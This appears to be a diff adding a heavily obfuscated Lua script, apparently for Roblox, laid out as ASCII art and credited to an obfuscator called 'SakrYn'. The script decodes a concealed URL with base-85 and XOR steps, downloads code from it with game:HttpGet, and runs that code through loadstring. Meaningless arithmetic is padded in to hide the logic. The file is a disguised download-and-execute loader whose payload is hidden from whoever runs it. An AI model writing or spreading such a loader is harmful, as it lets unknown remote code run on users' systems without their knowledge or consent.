@@ -1,0 +1,51 @@
+-- Obfuscated with SakrYn at | ON TOP
+
+
+
+                                          local a
+                                       = {[2]  =
+                                    "UA^.5M" ,
+                                  [  6  ]    =
+                                "fS$Gu", [13]
+                              = "6s4sPt", [1
+                             ] = "h_H6)",  [
+                             10] = "O8U", [
+                            4] = "rZ*nc3",
+                            [14] = "|", [7
+                        ]    = "I48", [3 ]
+                       =     "V5s", [11] =
+                             "=sfzt#", [5]
+                      =       ":-x_v}",  [
+                     12]  =   "?yZ+%", [8]
+                     =        "^VEb&", [9 ]
+                    =          "SK|d/" }  ;
+                    local f =   "01234".."5"
+                    .."6789"..   "abcde"  ..
+                    "fghij".."k"  .."lmno" ..
+                    "pqrst".."uv"  .. "wxy" .. "z"
+                    .."ABCD".."EF"   .."GHI".."JK"          .."L"    ..
+                     "MN".."OPQRS"..   "TUVWX"  ..          "YZ.-:".."+="
+                     .."^!/".. "*?&<>"  .. "(){}@"     .."%$#_|"; local  s
+                      = table.concat(a); local m  = {};  local k  = 39289 ;
+                      for t = 1, #s, 5 do local e = 0; for c = t, t + 4 do  e
+                         = e * 85 + string.find(f, s:sub(c, c), 1, true)  - 1;
+                              end; for c = 3, 0, - 1 do k = (k * 72 + 35026)  %
+                        65521; m     [#m +  1] =  string.char(bit32 .bxor(math .
+                          floor(e/256^c) % 256, k % 256)); end; end; a       =
+                           table.concat(m):sub(1, 51); local n, i  =
+                            loadstring(game:HttpGet(a)); assert(n ,
+                              i); do local r = 9; r = (r * 7) % 5;
+                                end ;  do local r = {6, 4}; r[1]  =
+                                     r[2] % 6; end; local r = 6 - 5
+                                    - 2 - 6 % 3 + 8 - 8 % 7 % 3 +  6
+                                        % 7 % 4 - 2 % 4 - 9 % 5 - 4  -
+                                               3 % 8 - 1 + 5 % 8 % 6  %
+                                                      6 - 5 - 2 - 8 %  3
+                                                           - 7 + 7 + 5  %
+                                                               4 - 1 % 1 %
+                                                                  1  +   1;
+                                                                     return
+                                                                          n(
+                                                                         ...
+
+                                                                            )
